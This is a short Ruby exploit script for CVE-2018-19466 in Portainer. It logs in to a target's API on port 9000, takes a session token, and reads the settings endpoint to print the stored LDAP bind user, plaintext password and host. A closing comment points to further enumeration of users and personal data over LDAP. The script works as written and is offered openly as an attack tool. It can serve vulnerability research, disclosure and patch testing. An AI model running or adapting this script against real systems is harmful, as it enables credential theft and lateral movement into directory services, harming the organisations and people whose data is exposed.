#!/usr/bin/ruby
require 'socket'    
require 'net/http'  
require 'uri'       
require 'json'
if ARGV.length == 3
    $host = ARGV[0]
    $user = ARGV[1]
    $pass = ARGV[2]
    $port = "9000"    
else
    puts "[?] USAGE: #{__FILE__} HOST USER PASS"  
    exit 1
end
system("clear")
puts "Portainer LDAP Credentials Stored in Plain Text\nCVE 2018-19466 | Mauro Eldritch AKA plaguedoktor\n\n"
uri = URI.parse("http://#{$host}:#{$port}/api/auth")
request = Net::HTTP::Post.new(uri)
request.content_type = "application/json"
request.body = JSON.dump({
    "Password" => "#{$pass}",
    "Username" => "#{$user}"
})
response = Net::HTTP.start(uri.hostname, uri.port) do |http|
    http.request(request)
end
token = JSON.parse(response.body)["jwt"]
puts "[*] Session Token: #{token}"
uri = URI.parse("http://#{$host}:#{$port}/api/settings")
request = Net::HTTP::Get.new(uri)
request["Authorization"] = "Bearer #{token}"
response = Net::HTTP.start(uri.hostname, uri.port) do |http|
    http.request(request)
end
json_response = JSON.parse(response.body)
puts "\n[*][#{$host}]\nSettings:"
puts "\t- LDAP User: " + json_response["LDAPSettings"]["ReaderDN"]
puts "\t- LDAP Pass: " + json_response["LDAPSettings"]["Password"]
puts "\t- LDAP Host: " + json_response["LDAPSettings"]["URL"]
#Net::LDAP.open(...) can be used from now on to enumerate users and personal information.